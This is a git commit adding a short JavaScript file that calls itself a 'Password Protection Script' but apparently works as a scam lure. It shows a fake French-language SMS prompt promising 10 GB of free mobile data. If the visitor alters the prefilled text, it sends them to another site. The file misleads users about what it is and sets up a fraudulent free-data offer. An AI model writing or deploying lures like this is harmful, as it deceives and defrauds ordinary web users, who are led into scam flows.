053065664b73426e2e2fa29a261b3075962487ba
itidnewblog3 <ukpehaitid1@gmail.com>
2025-12-17 20:17:36 +0100

    Create active-benin.js

---
+++ active-benin.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ACTIVER 10 Go'
+password = prompt(
+  'SMS: Félicitations ! Votre numéro est éligible pour recevoir 10 Go de données gratuits. Veuillez appuyer sur OK pour obtenir les données.',
+  'ACTIVER 10 Go'
+);
+if (password != 'ACTIVER 10 Go') {
+  location.href = 'https://lhegit.org/cook-athon.html';
+}
